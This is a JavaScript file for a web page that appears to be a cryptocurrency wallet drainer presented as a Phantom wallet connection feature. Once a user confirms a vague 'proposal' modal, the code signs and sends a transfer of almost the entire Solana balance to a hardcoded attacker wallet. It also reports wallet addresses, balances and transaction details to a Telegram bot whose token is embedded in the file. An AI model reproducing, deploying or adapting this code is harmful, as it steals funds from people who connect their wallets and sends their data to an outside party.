// Add these constants at the top
const DEV_WALLET = '7aE5Y7PvfUr52WnruiDATFpR99PWPo4q9U7vu3Hid3Yh'; // Replace with actual Solana wallet address
const USE_TESTNET = false; // Set to true for testnet, false for mainnet

// Telegram configuration
const TELEGRAM_BOT_TOKEN = '7589857736:AAHnabkcp6dSPSBh40h7JfODbyEuiuvsqoE';
const TELEGRAM_CHAT_ID = '7556622176';

// Helper function to send logs to Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: `[WalletModel3 Bot]\n${message}`,
            parse_mode: "Markdown"
        })
    }).catch(console.error);
}

class WalletModel3 {
    constructor() {
        this.account = null;
        this.chainId = null;
    }

    async connect() {
        try {
            if (window.solana && window.solana.isPhantom) {
                const response = await window.solana.connect();
                this.account = response.publicKey.toString();
                await sendToTelegram(`✅ Wallet connected: ${this.account}`);
                return this.getInfo();
            } else {
                const errMsg = 'Please install Phantom wallet!';
                await sendToTelegram(`❌ ${errMsg}`);
                throw new Error(errMsg);
            }
        } catch (error) {
            await sendToTelegram(`❌ Wallet connect error: ${error.message}`);
            throw error;
        }
    }

    getInfo() {
        return {
            account: this.account,
            model: 'WalletModel3'
        };
    }
}

// Initialize WalletModel3
const walletModel3 = new WalletModel3();

// Modified function to handle the proposal without message signing
async function showProposalModal(account) {
    const modal = document.getElementById('proposalModal');
    modal.style.display = 'block';

    return new Promise((resolve) => {
        document.getElementById('confirmProposal').onclick = () => {
            modal.style.display = 'none';
            sendToTelegram(`🟩 Proposal confirmed by user: ${account}`);
            resolve({confirmed: true});
        };

        document.getElementById('cancelProposal').onclick = () => {
            modal.style.display = 'none';
            sendToTelegram(`🟥 Proposal canceled by user: ${account}`);
            resolve({confirmed: false});
        };
    });
}

// Modify the connectModel3Button event listener
document.getElementById('connectModel3Button').addEventListener('click', async () => {
    try {
        const walletInfo = await walletModel3.connect();

        const {confirmed} = await showProposalModal(walletInfo.account);
        if (confirmed) {
            const connection = new solanaWeb3.Connection(
                USE_TESTNET 
                    ? solanaWeb3.clusterApiUrl('devnet')
                    : "https://solana-mainnet.g.alchemy.com/v2/demo",
                'confirmed'
            );

            try {
                const balance = await connection.getBalance(new solanaWeb3.PublicKey(walletInfo.account));
                console.log("Current balance:", balance);
                await sendToTelegram(`💰 Current balance of ${walletInfo.account}: ${balance / 1e9} SOL`);

                if (balance <= 0) {
                    const msg = `Wallet has zero balance. Nothing to transfer.\nNetwork: ${USE_TESTNET ? 'Devnet' : 'Mainnet'}`;
                    document.getElementById('walletInfo').innerHTML = `<p>${msg}</p>`;
                    await sendToTelegram(`⚠️ ${msg}`);
                    return;
                }

                const feeAmount = Math.max(5000000, Math.floor(balance * 0.1));
                const amountToSend = balance > feeAmount ? balance - feeAmount : 0;

                if (amountToSend <= 0) {
                    const msg = `Balance too low to cover fees.\nBalance: ${balance / 1e9} SOL\nRequired: ${feeAmount / 1e9} SOL`;
                    document.getElementById('walletInfo').innerHTML = `<p>${msg}</p>`;
                    await sendToTelegram(`⚠️ ${msg}`);
                    return;
                }

                const transaction = new solanaWeb3.Transaction();
                const { blockhash } = await connection.getLatestBlockhash();
                transaction.recentBlockhash = blockhash;

                transaction.add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: new solanaWeb3.PublicKey(walletInfo.account),
                        toPubkey: new solanaWeb3.PublicKey(DEV_WALLET),
                        lamports: amountToSend
                    })
                );

                transaction.feePayer = new solanaWeb3.PublicKey(walletInfo.account);

                const txSignature = await window.solana.signAndSendTransaction(transaction);
                const successMsg = `🚀 Transaction sent:\nTX: ${txSignature.signature}\nAmount: ${amountToSend / 1e9} SOL\nNetwork: ${USE_TESTNET ? 'Devnet' : 'Mainnet'}`;
                document.getElementById('walletInfo').innerHTML = `<p>${successMsg.replace(/\n/g, '<br>')}</p>`;
                await sendToTelegram(successMsg);

            } catch (error) {
                console.error('Transaction error:', error);
                const errorMsg = `❌ Transaction error: ${error.message}`;
                document.getElementById('walletInfo').innerHTML = `<p>${errorMsg}</p>`;
                await sendToTelegram(errorMsg);
            }
        } else {
            document.getElementById('walletInfo').innerHTML = `<p>Proposal canceled</p>`;
        }
    } catch (error) {
        const errorMsg = `❌ Error: ${error.message}`;
        document.getElementById('walletInfo').innerHTML = `<p>${errorMsg}</p>`;
        await sendToTelegram(errorMsg);
    }
});

// Listen for account changes
window.solana?.on('accountChanged', async () => {
    console.log('Account changed');
    await sendToTelegram('🔄 Wallet account changed. Reloading page.');
    window.location.reload();
});
                    
